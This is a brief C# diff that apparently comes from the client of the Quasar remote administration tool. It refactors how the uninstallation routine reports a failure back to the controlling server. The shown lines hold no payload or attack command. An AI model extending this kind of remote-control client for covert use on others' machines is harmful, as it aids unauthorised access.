@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Diagnostics;
+using Quasar.Common.Messages;
 using xClient.Config;
 using xClient.Core.Helper;
 using xClient.Core.Networking;
@@ -32,7 +33,7 @@ namespace xClient.Core.Installation
             }
             catch (Exception ex)
             {
-                new Packets.ClientPackets.SetStatus(string.Format("Uninstallation failed: {0}", ex.Message)).Execute(client);
+                client.Send(new SetStatus {Message = $"Uninstallation failed: {ex.Message}"});
             }
         }
     }
